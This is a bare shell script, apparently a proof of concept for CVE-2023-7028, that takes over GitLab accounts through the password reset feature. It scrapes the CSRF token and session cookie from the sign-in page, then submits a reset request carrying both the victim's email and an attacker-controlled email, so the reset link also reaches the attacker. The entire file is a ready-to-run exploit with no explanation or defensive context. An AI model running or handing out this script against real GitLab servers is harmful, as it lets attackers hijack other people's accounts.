#!/bin/sh

if [ "$#" -ne 3 ]; then
    echo "missing arguments like:"
    echo "./cve-2023-7028.sh https://gitlab.site.com useremail@gitlab.site.com otheremail@otherdomain.com"
    exit 1
fi

body_header=$(curl -k -i "${1}/users/sign_in" -s)
csrf_token=$(echo $body_header | grep -o '<meta name="csrf-token" content="[^"]*' | cut -d'"' -f4)
cookies=_gitlab_session=$(echo $body_header | grep "Set-Cookie: _gitlab_session" | grep -o '_gitlab_session=[^;]*' | cut -d'=' -f2)

curl -k -i -b $cookies "${1}/users/password" --data "user[email][]=${2}&user[email][]=${3}" --data-urlencode "authenticity_token=${csrf_token}"
